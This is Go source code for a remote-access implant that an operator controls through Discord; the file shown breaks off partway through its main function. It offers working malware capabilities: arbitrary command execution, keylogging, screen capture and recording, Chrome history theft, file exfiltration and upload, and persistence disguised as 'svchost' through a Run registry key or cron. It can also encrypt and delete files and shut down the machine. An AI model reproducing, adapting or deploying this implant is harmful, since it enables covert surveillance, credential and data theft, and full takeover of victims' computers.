// Discord C2
// William Moody (Modified)
// 08.12.2022

// run <command>         - Run the given command (Windows: cmd.exe, Other: bash)
// screenshot            - Take a screenshot
// download <path>       - Download the given file (Less than 8MB)
// upload <path> *attach - Upload the attached file (Less than 8MB)
// 💀                    - Kill the process
// sysinfo               - Gather system information
// ls <path>             - List directory contents
// lsr <path>            - List directory contents recursively
// find <path> <pattern> - Search for files matching pattern
// cd <path>             - Change current working directory
// rm <path>             - Delete file or directory
// ps                    - List running processes
// kill <pid>            - Kill a process by PID
// persist               - Add persistence mechanism
// clip get              - Get clipboard contents
// clip set <text>       - Set clipboard contents
// pwd                   - Get current working directory
// whoami                - Get current user details
// env                   - List environment variables
// netstat               - List network connections
// shutdown              - Shutdown the machine
// reboot                - Reboot the machine
// openurl <url>         - Open URL in default browser
// browserdata           - Extract Chrome browser history (basic)
// keylog start          - Start keylogging to a file
// keylog stop           - Stop keylogging
// keylog get            - Upload the keylog file (Less than 8MB)
// encrypt <path> <pass> - Encrypt file with password
// decrypt <path> <pass> - Decrypt file with password
// screenrec start       - Start screen recording (GIF, primary display)
// screenrec stop        - Stop screen recording
// screenrec get         - Upload the screen recording GIF (Less than 8MB)

// Linux   - GOOS=linux GOARCH=amd64 go build client.go
// Windows - GOOS=windows GOARCH=amd64 go build client.go

package main

import (
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"crypto/sha256"
	"database/sql"
	"fmt"
	"image"
	"image/color"
	"image/draw"
	"image/gif"
	"image/png"
	"io"
	"os"
	"os/signal"
	"os/exec"
	"os/user"
	mrand "math/rand"
	"net"
	"net/http"
	"runtime"
	"strings"
	"syscall"
	"time"
	"path/filepath"

	"github.com/kbinani/screenshot"
	"github.com/bwmarrin/discordgo"
	"github.com/atotto/clipboard"
	hook "github.com/robotn/gohook"
	_ "github.com/mattn/go-sqlite3" // For browserdata
)

var myChannelId string // Global variable

var keyLogFile *os.File
var isKeyLogging bool

var isRecording bool
var screenRecFile *os.File
var gifOut *gif.GIF
var recChan chan bool
var recFPS = 5 // Frames per second, adjustable

func getTmpDir() string {
	if runtime.GOOS == "windows" {
		return "C:\\Windows\\Tasks\\"
	} else {
		return "/tmp/"
	}
}

func eventToString(ev hook.Event) string {
	if ev.Keychar != 0 {
		return string(ev.Keychar)
	}
	switch ev.Rawcode {
	case 32:
		return " "
	case 13:
		return "[Enter]"
	case 8:
		return "[Backspace]"
	case 9:
		return "[Tab]"
	case 27:
		return "[Esc]"
	case 37:
		return "[Left]"
	case 38:
		return "[Up]"
	case 39:
		return "[Right]"
	case 40:
		return "[Down]"
	default:
		return fmt.Sprintf("[VK_%d]", ev.Rawcode)
	}
}

// DeriveKey derives a 32-byte key from the password using SHA-256
func deriveKey(password string) []byte {
	h := sha256.New()
	h.Write([]byte(password))
	return h.Sum(nil)
}

// EncryptFile encrypts the file at path with the given password
func encryptFile(path, password string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	key := deriveKey(password)
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(crand.Reader, nonce); err != nil {
		return err
	}

	ciphertext := gcm.Seal(nonce, nonce, data, nil)

	return os.WriteFile(path+".enc", ciphertext, 0644)
}

// DecryptFile decrypts the file at path with the given password
func decryptFile(path, password string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	key := deriveKey(password)
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return err
	}

	return os.WriteFile(path+".dec", plaintext, 0644)
}

func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignores messages in other channels and own messages
	if m.ChannelID != myChannelId || m.Author.ID == s.State.User.ID {
		return
	}

	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐") // Processing...
	flag := 0

	// Run command
	if strings.HasPrefix(m.Content, "run ") {
		command := strings.TrimPrefix(m.Content, "run ")
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("C:\\Windows\\System32\\cmd.exe", "/k", command)
		} else {
			cmd = exec.Command("/bin/bash", "-c", command)
		}
		out, err := cmd.CombinedOutput()
		if err != nil {
			out = append(out, 0x0a)
			out = append(out, []byte(err.Error())...)
		}

		// Message is too long, save as file
		if len(out) > 1987 {
			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
			f.Write(out)
			fileName := f.Name()
			f.Close()

			f, _ = os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		} else {
			var resp strings.Builder
			resp.WriteString("```bash\n")
			resp.WriteString(string(out) + "\n")
			resp.WriteString("```")
			s.ChannelMessageSendReply(m.ChannelID, resp.String(), m.Reference())
		}
		flag = 1

	// Take screenshot
	} else if m.Content == "screenshot" {
		n := screenshot.NumActiveDisplays()
		for i := 0; i < n; i++ {
			bounds := screenshot.GetDisplayBounds(i)
			img, err := screenshot.CaptureRect(bounds)
			if err != nil {
				s.ChannelMessageSendReply(m.ChannelID, "Failed to capture screenshot", m.Reference())
				continue
			}

			fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), i, bounds.Dx(), bounds.Dy())
			file, err := os.Create(fileName)
			if err != nil {
				s.ChannelMessageSendReply(m.ChannelID, "Failed to save screenshot", m.Reference())
				continue
			}
			png.Encode(file, img)
			file.Close()

			f, _ := os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		}
		flag = 1

	// Download file
	} else if strings.HasPrefix(m.Content, "download ") {
		fileName := strings.TrimPrefix(m.Content, "download ")
		f, err := os.Open(fileName)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "File not found", m.Reference())
			return
		}
		fi, _ := f.Stat()
		defer f.Close()
		if fi.Size() < 8388608 { // 8MB file limit
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
			flag = 1
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "File is bigger than 8MB 😔", m.Reference())
		}

	// Upload file
	} else if strings.HasPrefix(m.Content, "upload ") {
		path := strings.TrimPrefix(m.Content, "upload ")
		if len(m.Attachments) > 0 {
			out, err := os.Create(path)
			if err != nil {
				s.ChannelMessageSendReply(m.ChannelID, "Failed to create file", m.Reference())
				return
			}
			defer out.Close()
			resp, err := http.Get(m.Attachments[0].URL)
			if err != nil {
				s.ChannelMessageSendReply(m.ChannelID, "Failed to download attachment", m.Reference())
				return
			}
			defer resp.Body.Close()
			io.Copy(out, resp.Body)
			s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to "+path, m.Reference())
		}
		flag = 1

	// System info
	} else if m.Content == "sysinfo" {
		var sb strings.Builder
		sb.WriteString("**System Info:**\n")
		sb.WriteString(fmt.Sprintf("OS: %s/%s\n", runtime.GOOS, runtime.GOARCH))
		sb.WriteString(fmt.Sprintf("CPU Cores: %d\n", runtime.NumCPU()))
		// Memory example
		if runtime.GOOS == "linux" {
			out, _ := exec.Command("free", "-h").Output()
			sb.WriteString("Memory:\n```" + string(out) + "```\n")
		} else {
			out, _ := exec.Command("systeminfo").Output()
			sb.WriteString("System Info:\n```" + string(out) + "```\n")
		}
		// Network interfaces
		ifaces, _ := net.Interfaces()
		sb.WriteString("Network Interfaces:\n")
		for _, i := range ifaces {
			addrs, _ := i.Addrs()
			for _, addr := range addrs {
				sb.WriteString(fmt.Sprintf("- %s: %s\n", i.Name, addr.String()))
			}
		}
		s.ChannelMessageSendReply(m.ChannelID, sb.String(), m.Reference())
		flag = 1

	// List directory
	} else if strings.HasPrefix(m.Content, "ls ") || m.Content == "ls" {
		path := strings.TrimPrefix(m.Content, "ls ")
		if strings.TrimSpace(path) == "" {
			path = "."
		}
		files, err := os.ReadDir(path)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error: "+err.Error(), m.Reference())
			return
		}
		var sb strings.Builder
		sb.WriteString("Directory listing for " + path + ":\n")
		for _, f := range files {
			info, _ := f.Info()
			sb.WriteString(fmt.Sprintf("- %s (Size: %d, Dir: %t)\n", f.Name(), info.Size(), info.IsDir()))
		}
		if len(sb.String()) > 1987 {
			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
			f.Write([]byte(sb.String()))
			fileName := f.Name()
			f.Close()

			f, _ = os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: "ls.txt", Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		} else {
			s.ChannelMessageSendReply(m.ChannelID, sb.String(), m.Reference())
		}
		flag = 1

	// Recursive list directory
	} else if strings.HasPrefix(m.Content, "lsr ") || m.Content == "lsr" {
		path := strings.TrimPrefix(m.Content, "lsr ")
		if strings.TrimSpace(path) == "" {
			path = "."
		}
		var sb strings.Builder
		sb.WriteString("Recursive directory listing for " + path + ":\n")
		err := filepath.Walk(path, func(walkPath string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			sb.WriteString(fmt.Sprintf("- %s (Size: %d, Dir: %t)\n", walkPath, info.Size(), info.IsDir()))
			return nil
		})
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error: "+err.Error(), m.Reference())
			return
		}
		output := sb.String()
		if len(output) > 1987 {
			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
			f.Write([]byte(output))
			fileName := f.Name()
			f.Close()

			f, _ = os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: "lsr.txt", Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		} else {
			s.ChannelMessageSendReply(m.ChannelID, output, m.Reference())
		}
		flag = 1

	// File search
	} else if strings.HasPrefix(m.Content, "find ") {
		parts := strings.SplitN(strings.TrimPrefix(m.Content, "find "), " ", 2)
		if len(parts) < 2 {
			s.ChannelMessageSendReply(m.ChannelID, "Usage: find <path> <pattern>", m.Reference())
			return
		}
		path, pattern := parts[0], parts[1]
		var sb strings.Builder
		sb.WriteString("Files matching '" + pattern + "' in " + path + ":\n")
		err := filepath.Walk(path, func(walkPath string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if !info.IsDir() && strings.Contains(strings.ToLower(info.Name()), strings.ToLower(pattern)) {
				sb.WriteString("- " + walkPath + "\n")
			}
			return nil
		})
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error: "+err.Error(), m.Reference())
			return
		}
		output := sb.String()
		if len(output) > 1987 {
			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
			f.Write([]byte(output))
			fileName := f.Name()
			f.Close()

			f, _ = os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: "find.txt", Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		} else {
			s.ChannelMessageSendReply(m.ChannelID, output, m.Reference())
		}
		flag = 1

	// Change directory
	} else if strings.HasPrefix(m.Content, "cd ") {
		path := strings.TrimPrefix(m.Content, "cd ")
		err := os.Chdir(path)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error: "+err.Error(), m.Reference())
		} else {
			newCwd, _ := os.Getwd()
			s.ChannelMessageSendReply(m.ChannelID, "Changed to "+newCwd, m.Reference())
		}
		flag = 1

	// Remove file/dir
	} else if strings.HasPrefix(m.Content, "rm ") {
		path := strings.TrimPrefix(m.Content, "rm ")
		err := os.RemoveAll(path) // Recursive delete
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error: "+err.Error(), m.Reference())
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "Deleted: "+path, m.Reference())
		}
		flag = 1

	// List processes
	} else if m.Content == "ps" {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("tasklist")
		} else {
			cmd = exec.Command("ps", "aux")
		}
		out, err := cmd.Output()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error: "+err.Error(), m.Reference())
			return
		}
		output := string(out)
		if len(output) > 1987 {
			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
			f.Write([]byte(output))
			fileName := f.Name()
			f.Close()

			f, _ = os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: "ps.txt", Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "```"+output+"```", m.Reference())
		}
		flag = 1

	// Kill process by PID
	} else if strings.HasPrefix(m.Content, "kill ") {
		pidStr := strings.TrimPrefix(m.Content, "kill ")
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("taskkill", "/PID", pidStr, "/F")
		} else {
			cmd = exec.Command("kill", "-9", pidStr)
		}
		err := cmd.Run()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error: "+err.Error(), m.Reference())
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "Killed PID "+pidStr, m.Reference())
		}
		flag = 1

	// Add persistence
	} else if m.Content == "persist" {
		binaryPath, err := os.Executable()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to get executable path", m.Reference())
			return
		}
		hiddenPath := getTmpDir() + "svchost" + filepath.Ext(binaryPath) // Use Ext for extension
		src, err := os.Open(binaryPath)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to open binary", m.Reference())
			return
		}
		defer src.Close()
		dst, err := os.Create(hiddenPath)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to create hidden file", m.Reference())
			return
		}
		defer dst.Close()
		_, err = io.Copy(dst, src)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to copy binary", m.Reference())
			return
		}
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "UpdateSvc", "/t", "REG_SZ", "/d", hiddenPath, "/f")
		} else {
			cmd = exec.Command("bash", "-c", "(crontab -l 2>/dev/null; echo '@reboot " + hiddenPath + "') | crontab -")
		}
		err = cmd.Run()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to add persistence: "+err.Error(), m.Reference())
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "Persistence added to "+hiddenPath, m.Reference())
		}
		flag = 1

	// Clipboard get
	} else if m.Content == "clip get" {
		text, err := clipboard.ReadAll()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error: "+err.Error(), m.Reference())
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "Clipboard: "+text, m.Reference())
		}
		flag = 1

	// Clipboard set
	} else if strings.HasPrefix(m.Content, "clip set ") {
		text := strings.TrimPrefix(m.Content, "clip set ")
		err := clipboard.WriteAll(text)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error: "+err.Error(), m.Reference())
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "Clipboard set to "+text, m.Reference())
		}
		flag = 1

	// Get current working directory
	} else if m.Content == "pwd" {
		cwd, err := os.Getwd()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error: "+err.Error(), m.Reference())
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "Current directory: "+cwd, m.Reference())
		}
		flag = 1

	// Get current user
	} else if m.Content == "whoami" {
		currentUser, err := user.Current()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error: "+err.Error(), m.Reference())
		} else {
			var sb strings.Builder
			sb.WriteString(fmt.Sprintf("Username: %s\n", currentUser.Username))
			sb.WriteString(fmt.Sprintf("UID: %s\n", currentUser.Uid))
			sb.WriteString(fmt.Sprintf("GID: %s\n", currentUser.Gid))
			sb.WriteString(fmt.Sprintf("HomeDir: %s\n", currentUser.HomeDir))
			s.ChannelMessageSendReply(m.ChannelID, sb.String(), m.Reference())
		}
		flag = 1

	// List environment variables
	} else if m.Content == "env" {
		envs := os.Environ()
		var sb strings.Builder
		for _, env := range envs {
			sb.WriteString(env + "\n")
		}
		output := sb.String()
		if len(output) > 1987 {
			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
			f.Write([]byte(output))
			fileName := f.Name()
			f.Close()

			f, _ = os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: "env.txt", Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "```"+output+"```", m.Reference())
		}
		flag = 1

	// Netstat - list network connections
	} else if m.Content == "netstat" {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("netstat", "-ano")
		} else {
			// Use ss if available, fallback to netstat
			if _, err := exec.LookPath("ss"); err == nil {
				cmd = exec.Command("ss", "-tuln")
			} else {
				cmd = exec.Command("netstat", "-tuln")
			}
		}
		out, err := cmd.Output()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error: "+err.Error(), m.Reference())
			return
		}
		output := string(out)
		if len(output) > 1987 {
			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
			f.Write([]byte(output))
			fileName := f.Name()
			f.Close()

			f, _ = os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: "netstat.txt", Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "```"+output+"```", m.Reference())
		}
		flag = 1

	// Shutdown
	} else if m.Content == "shutdown" {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("shutdown", "/s", "/f", "/t", "0")
		} else {
			cmd = exec.Command("shutdown", "-h", "now")
		}
		err := cmd.Run()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error: "+err.Error(), m.Reference())
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "Shutting down...", m.Reference())
		}
		flag = 1

	// Reboot
	} else if m.Content == "reboot" {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("shutdown", "/r", "/f", "/t", "0")
		} else {
			cmd = exec.Command("reboot")
		}
		err := cmd.Run()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error: "+err.Error(), m.Reference())
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "Rebooting...", m.Reference())
		}
		flag = 1

	// Open URL
	} else if strings.HasPrefix(m.Content, "openurl ") {
		url := strings.TrimPrefix(m.Content, "openurl ")
		var cmd *exec.Cmd
		switch runtime.GOOS {
		case "windows":
			cmd = exec.Command("rundll32", "url.dll,FileProtocolHandler", url)
		case "darwin":
			cmd = exec.Command("open", url)
		default: // Linux
			cmd = exec.Command("xdg-open", url)
		}
		err := cmd.Start()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error: "+err.Error(), m.Reference())
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "Opened URL: "+url, m.Reference())
		}
		flag = 1

	// Browser data (basic Chrome history extraction)
	} else if m.Content == "browserdata" {
		var historyPath string
		if runtime.GOOS == "windows" {
			historyPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\History")
		} else if runtime.GOOS == "linux" {
			historyPath = filepath.Join(os.Getenv("HOME"), ".config/google-chrome/Default/History")
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "Unsupported OS for browserdata", m.Reference())
			return
		}

		// Copy to temp to avoid lock
		tempPath := getTmpDir() + "chrome_history.db"
		src, err := os.Open(historyPath)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to open history file: "+err.Error(), m.Reference())
			return
		}
		defer src.Close()
		dst, err := os.Create(tempPath)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to create temp file: "+err.Error(), m.Reference())
			return
		}
		defer dst.Close()
		_, err = io.Copy(dst, src)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to copy history file: "+err.Error(), m.Reference())
			return
		}

		db, err := sql.Open("sqlite3", tempPath)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to open database: "+err.Error(), m.Reference())
			return
		}
		defer db.Close()

		rows, err := db.Query("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to query database: "+err.Error(), m.Reference())
			return
		}
		defer rows.Close()

		var sb strings.Builder
		sb.WriteString("Chrome Browser History (last 100):\n")
		for rows.Next() {
			var url, title string
			var visitCount int
			var lastVisitTime int64
			err = rows.Scan(&url, &title, &visitCount, &lastVisitTime)
			if err != nil {
				continue
			}
			timeStr := time.Unix(0, (lastVisitTime-11644473600000000)*100).UTC().Format(time.RFC3339) // Convert Chrome timestamp
			sb.WriteString(fmt.Sprintf("- URL: %s | Title: %s | Visits: %d | Last Visit: %s\n", url, title, visitCount, timeStr))
		}

		output := sb.String()
		if len(output) > 1987 {
			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
			f.Write([]byte(output))
			fileName := f.Name()
			f.Close()

			f, _ = os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: "browserdata.txt", Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		} else {
			s.ChannelMessageSendReply(m.ChannelID, output, m.Reference())
		}
		os.Remove(tempPath) // Cleanup
		flag = 1

	// Keylog start
	} else if m.Content == "keylog start" {
		if isKeyLogging {
			s.ChannelMessageSendReply(m.ChannelID, "Keylogger already running", m.Reference())
			flag = 1
			return
		}
		var err error
		keyLogFile, err = os.Create(getTmpDir() + "keylog.txt")
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to create log file: "+err.Error(), m.Reference())
			return
		}
		isKeyLogging = true
		evChan := hook.Start()
		go func() {
			for ev := range evChan {
				if !isKeyLogging {
					break
				}
				if ev.Kind == hook.KeyDown {
					key := eventToString(ev)
					keyLogFile.WriteString(key + "\n")
				}
			}
			keyLogFile.Close()
		}()
		s.ChannelMessageSendReply(m.ChannelID, "Keylogger started", m.Reference())
		flag = 1

	// Keylog stop
	} else if m.Content == "keylog stop" {
		if !isKeyLogging {
			s.ChannelMessageSendReply(m.ChannelID, "Keylogger not running", m.Reference())
			flag = 1
			return
		}
		hook.End()
		isKeyLogging = false
		s.ChannelMessageSendReply(m.ChannelID, "Keylogger stopped", m.Reference())
		flag = 1

	// Keylog get
	} else if m.Content == "keylog get" {
		if keyLogFile == nil {
			s.ChannelMessageSendReply(m.ChannelID, "No keylog file", m.Reference())
			return
		}
		keyLogFile.Sync() // Flush to disk
		f, err := os.Open(keyLogFile.Name())
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to open log file", m.Reference())
			return
		}
		defer f.Close()
		fi, err := f.Stat()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to stat log file", m.Reference())
			return
		}
		if fi.Size() < 8388608 {
			fileStruct := &discordgo.File{Name: "keylog.txt", Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
			flag = 1
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "Log file is bigger than 8MB 😔", m.Reference())
		}

	// Screenrec start
	} else if m.Content == "screenrec start" {
		if isRecording {
			s.ChannelMessageSendReply(m.ChannelID, "Screen recording already running", m.Reference())
			flag = 1
			return
		}
		var err error
		screenRecFile, err = os.Create(getTmpDir() + "screenrec.gif")
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to create recording file: "+err.Error(), m.Reference())
			return
		}
		isRecording = true
		recChan = make(chan bool)
		gifOut = &gif.GIF{}
		go func() {
			palette := []color.Color{color.Black, color.White} // Basic palette, can expand
			for {
				select {
				case <-recChan:
					gif.EncodeAll(screenRecFile, gifOut)
					screenRecFile.Close()
					return
				default:
					bounds := screenshot.GetDisplayBounds(0) // Primary display
					img, err := screenshot.CaptureRect(bounds)
					if err != nil {
						continue
					}
					paletted := image.NewPaletted(img.Bounds(), palette)
					draw.FloydSteinberg.Draw(paletted, img.Bounds(), img, image.Point{})
					gifOut.Image = append(gifOut.Image, paletted)
					gifOut.Delay = append(gifOut.Delay, 100/recFPS) // Delay in 100ths of second
					time.Sleep(time.Second / time.Duration(recFPS))
				}
			}
		}()
		s.ChannelMessageSendReply(m.ChannelID, "Screen recording started (primary display, GIF format)", m.Reference())
		flag = 1

	// Screenrec stop
	} else if m.Content == "screenrec stop" {
		if !isRecording {
			s.ChannelMessageSendReply(m.ChannelID, "Screen recording not running", m.Reference())
			flag = 1
			return
		}
		recChan <- true
		isRecording = false
		s.ChannelMessageSendReply(m.ChannelID, "Screen recording stopped", m.Reference())
		flag = 1

	// Screenrec get
	} else if m.Content == "screenrec get" {
		if screenRecFile == nil {
			s.ChannelMessageSendReply(m.ChannelID, "No screen recording file", m.Reference())
			return
		}
		f, err := os.Open(screenRecFile.Name())
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to open recording file", m.Reference())
			return
		}
		defer f.Close()
		fi, err := f.Stat()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Failed to stat recording file", m.Reference())
			return
		}
		if fi.Size() < 8388608 {
			fileStruct := &discordgo.File{Name: "screenrec.gif", Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
			flag = 1
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "Recording file is bigger than 8MB 😔", m.Reference())
		}

	// Encrypt file
	} else if strings.HasPrefix(m.Content, "encrypt ") {
		parts := strings.SplitN(strings.TrimPrefix(m.Content, "encrypt "), " ", 2)
		if len(parts) < 2 {
			s.ChannelMessageSendReply(m.ChannelID, "Usage: encrypt <path> <password>", m.Reference())
			return
		}
		path, password := parts[0], parts[1]
		err := encryptFile(path, password)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error encrypting: "+err.Error(), m.Reference())
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "Encrypted: "+path+".enc", m.Reference())
		}
		flag = 1

	// Decrypt file
	} else if strings.HasPrefix(m.Content, "decrypt ") {
		parts := strings.SplitN(strings.TrimPrefix(m.Content, "decrypt "), " ", 2)
		if len(parts) < 2 {
			s.ChannelMessageSendReply(m.ChannelID, "Usage: decrypt <path> <password>", m.Reference())
			return
		}
		path, password := parts[0], parts[1]
		err := decryptFile(path, password)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Error decrypting: "+err.Error(), m.Reference())
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "Decrypted: "+path+".dec", m.Reference())
		}
		flag = 1

	// Kill the C2 process
	} else if m.Content == "💀" {
		flag = 2
	}

	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")
	if flag > 0 {
		s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
		if flag > 1 {
			s.Close()
			os.Exit(0)
		}
	}
}

func main() {
	dg, err := discordgo.New("<you token gere>") // Replace with secure env var in production
	if err != nil {
		return
	}

	dg.AddHandler(handler)
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	err = dg.Open()
	if err != nil {
		return
	}

	mrand.Seed(time.Now().UnixNano())
	sessionId := fmt.Sprintf("sess-%d", mrand.Intn(8999)+1000)
	c, _ := dg.GuildChannelCreate("<your channel id here>", sessionId, 0) // Replace with env var in production
	myChannelId = c.ID

	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	cwd, _ := os.Getwd()
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)

	// Gather additional info for first message
	// Get ps aux output
	var psOutput []byte
	var psErr error
	if runtime.GOOS == "windows" {
		psOutput, psErr = exec.Command("tasklist").Output()
	} else {
		psOutput, psErr = exec.Command("ps", "aux").Output()
	}

	psFile := ""
	if psErr == nil && len(psOutput) > 1987 {
		f, _ := os.CreateTemp(getTmpDir(), "ps_*.txt")
		f.Write(psOutput)
		psFile = f.Name()
		f.Close()
	}

	// Run 'ls /' (Linux/macOS) or 'dir C:\' (Windows) and include output
	var lsOutput []byte
	var lsErr error
	lsFile := ""
	if runtime.GOOS == "windows" {
